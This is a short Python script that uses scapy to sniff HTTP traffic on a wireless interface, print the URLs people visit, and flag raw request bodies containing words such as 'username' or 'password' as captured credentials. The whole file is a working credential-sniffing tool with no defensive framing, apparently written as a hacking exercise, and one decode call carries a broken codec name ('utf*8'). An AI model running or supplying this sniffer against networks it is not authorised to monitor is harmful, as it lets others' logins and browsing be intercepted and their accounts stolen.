#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff (interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    packet_url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    try:  
        packet_url = packet_url.decode('utf*8') # have to decode the packet_url before returning it or else it will throw an error "a bytes-like object is required, not 'str''. It was closed."
    except:
        print("[+] Error handling the packet")
    
    return packet_url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        try:
            load = load.decode('utf-8') # have to decode the load before going to loop or else it will throw an error "a bytes-like object is required, not 'str''. It was closed."
        except:
            print("[+] Error handling the packet")

        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet (packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Visited Url: ", url) # use , instead of + to avoid error "TypeError: can only concatenate str (not "bytes") to str"
        
        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible username/password: ", login_info, "\n") # use , instead of + to avoid error "TypeError: can only concatenate str (not "bytes") to str"

                
sniff("wlan0")